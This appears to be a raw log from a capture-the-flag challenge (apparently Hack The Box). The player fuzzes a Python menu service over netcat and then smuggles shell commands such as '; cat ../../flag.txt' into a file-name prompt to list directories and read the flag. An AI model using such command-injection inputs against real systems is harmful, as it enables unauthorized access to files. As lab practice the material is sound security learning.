
This is interesting:

└──╼ #nc 64\.227\.37\.214 30880

\[\*\] Directory to work in: aKomTaFRQr6qAqgglw8BuuUloJs32UAk

Component List:

\+===============\+
|               |
|  1\. Head  🤖  |
|  2\. Torso 🦴   |
|  3\. Hands 💪  |
|  4\. Legs  🦵   |
|               |
\+===============\+

\[\*\] Choose component: 1,2,
Traceback \(most recent call last\):
File "/home/ctf/artifacts\.py", line 96, in \<module\>
ans = subjects\(\)
File "/home/ctf/artifacts\.py", line 38, in subjects
ans = int\(input\(colored\("\[\*\] Choose component: ", "magenta"\)\)\)
ValueError: invalid literal for int\(\) with base 10: '1,2,'

**looks like python is running, will try to fuzz each option a little more**\-\- /home/ctf/artifacts\.py

**
**\. Compress artifact \(zip \<name\>\.zip \<name\> \<options\>\)
5\. Change directory  \(cd \<dirname\>\)
6\. Clean directory   \(rm \-rf \./\*\)
7\. Exit

\[\*\] Choose action: 3


Insert name you want to read: ls \-lsaF \.\.
cat: unrecognized option: l
BusyBox v1\.34\.1 \(2021\-11\-23 00:57:35 UTC\) multi\-call binary\.

Usage: cat \[\-nbvteA\] \[FILE\]\.\.\.

Print FILEs to stdout

\-n	Number output lines
\-b	Number nonempty lines
\-v	Show nonprinting characters as ^x or M\-x
\-t	\.\.\.and tabs as ^I
\-e	\.\.\.and end lines with $
\-A	Same as \-vte

Actions:

1\. Create artifact
2\. List directory    \(pwd; ls \-la\)
3\. Read artifact     \(cat \./\<name\>\)
4\. Compress artifact \(zip \<name\>\.zip \<name\> \<options\>\)
5\. Change directory  \(cd \<dirname\>\)
6\. Clean directory   \(rm \-rf \./\*\)
7\. Exit

\[\*\] Choose action: 3


Insert name you want to read: ; ls \-lsaF \.\.
cat: read error: Is a directory
total 24
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:50 \./
4 drwxr\-sr\-x    1 ctf      ctf           4096 May 14 21:50 \.\./
4 drwxr\-sr\-x    2 ctf      ctf           4096 May 14 21:50 Hands/
4 drwxr\-sr\-x    2 ctf      ctf           4096 May 14 21:50 Head/
4 drwxr\-sr\-x    2 ctf      ctf           4096 May 14 21:50 Legs/
4 drwxr\-sr\-x    2 ctf      ctf           4096 May 14 21:50 Torso/

Actions:

1\. Create artifact
2\. List directory    \(pwd; ls \-la\)
3\. Read artifact     \(cat \./\<name\>\)
4\. Compress artifact \(zip \<name\>\.zip \<name\> \<options\>\)
5\. Change directory  \(cd \<dirname\>\)
6\. Clean directory   \(rm \-rf \./\*\)
7\. Exit

\[\*\] Choose action: 3


Insert name you want to read: ; ls \-lsaF \.\./\.\.
cat: read error: Is a directory
total 180
4 drwxr\-sr\-x    1 ctf      ctf           4096 May 14 21:50 \./
8 drwxr\-xr\-x    1 root     root          4096 Mar  3 15:18 \.\./
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 5YVIePeRwJ8rzLCvyLX2mobQblJCFP93/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:47 5ccNIdmCQsyEM9mPFUD0pUyHWcmQMcfN/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 6MzqdH59mKfNAkbELmXlXgnGCPvex5cE/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 8ijrRW7JjnpsyYkPaSZoqIiibL3O8QNB/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 9yIXNoAIeYgyJjx9TsjfP05DT0lhVV8x/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 AGflZCfUFncpaR3Egslr10J8ukA3XjAK/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:46 CuhOjuZ3iLvtnXCgP08AN25k39L86gl6/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 GpLnrYEWQxWLWGVcAkGhbJilFloUqZyb/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:40 HYmOLPPhKvaoHQ86GLPAcGHqt1DhUbmm/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 IYBtcDOnW05PZjt1QnBF3xROG2FzLuvb/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:49 KawzmvJTEYDdDATbQLbGm8bfY8f7BgDh/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 NKkz6lSbV2SIje0X75Z9cnTP9xgA8Mp3/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 OJN5xuwtiE2I6i7hLUCkosah5KzDHuCO/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 PoMvRWOMaSRMO0vcdctOPUJYGntPBlHi/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:50 ROF3ZeeYLx0vFuFLRa3QIYCYmkKFMaJY/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 VgtO8HeoShxj5PTwrI7eNmWsaHsEIz98/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 WvDA5IRgER75KlpG4KOebDUm6AshtDoa/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:47 aKomTaFRQr6qAqgglw8BuuUloJs32UAk/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:49 aOWCDj5vrPyKPR6G48eeSq5mqIO4i8Rw/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 aVOY6CSUCWKGWn3Xc2Jdt0h8vgHxW83C/
4 \-rwxrwxr\-x    1 root     root          3166 May 12 23:51 artifacts\.py\*
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:49 bbRo2DWtLN7SqhnBVWzsFO893A3xM1Fj/
4 \-rw\-rw\-r\-\-    1 root     root           263 May 12 23:32 clear\.py
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 dhppC1Eu5VVrD5FiPJGnWu2G7rr65mlH/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 eS6hGbouIOxvQ4EzFr0oFeOA35CBbUJk/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:49 fXjGPzNI8gEKcVsLliK7KJcIvcZ4UdEB/
4 \-rw\-rw\-r\-\-    1 root     root            38 May 12 17:37 flag\.txt
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:43 g6c6OJuzqop8yGtD4reZMg0n2zQV7rmN/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 gcvgAbCRoHnaOIEuWKHqiWrqBJyLQLj4/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 jBFRw27yGLpDrNeSWDWulBzN5CWsVceO/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 mTk18paxxoeitd8MyMZ2mLu22PszkvFa/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 n0IyByCIhXoiNt7hV0ceJM6ZXXILAGKi/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 n0SBaN2FY0dFU6PFq6Bol5YNwRav0fNn/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:42 p75ZoYhRx2O1W9WVohRqLmLg8pH7kJOU/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 qSIuYttcV2Bd6ixe3HcbUS6jW9eshtDc/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 ql9gGZZT5Gad2j4d2rpFocjFxbOi90oV/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 rQk7PXg40NTqa2S0QhrbWSY5HJA1p0hq/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 sc6xGfbV6aYkj5dDltp2p4tuaQjQsmb4/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 tdUDxXrrpGA8rmkVKSGlrm5aj8LX7jJE/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 wlcXqM54R2OdwZtG81K7dlP3zeI8k9fL/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 xW3uEy0cnm51VHGFYgZ28eVzkjVFS3hb/
4 drwxr\-sr\-x    6 ctf      ctf           4096 May 14 21:41 z1j3H6BQ3mIKroJubgoQwWOUZ07KEaBG/

Actions:

1\. Create artifact
2\. List directory    \(pwd; ls \-la\)
3\. Read artifact     \(cat \./\<name\>\)
4\. Compress artifact \(zip \<name\>\.zip \<name\> \<options\>\)
5\. Change directory  \(cd \<dirname\>\)
6\. Clean directory   \(rm \-rf \./\*\)


**Holy shit can it be that easy?\!?\!**

Actions:

1\. Create artifact
2\. List directory    \(pwd; ls \-la\)
3\. Read artifact     \(cat \./\<name\>\)
4\. Compress artifact \(zip \<name\>\.zip \<name\> \<options\>\)
5\. Change directory  \(cd \<dirname\>\)
6\. Clean directory   \(rm \-rf \./\*\)
7\. Exit

\[\*\] Choose action: 3


Insert name you want to read: ; cat \.\./\.\./flag\.txt
cat: read error: Is a directory
HTB\{GTFO\_4nd\_m4k3\_th3\_b35t\_4rt1f4ct5\}

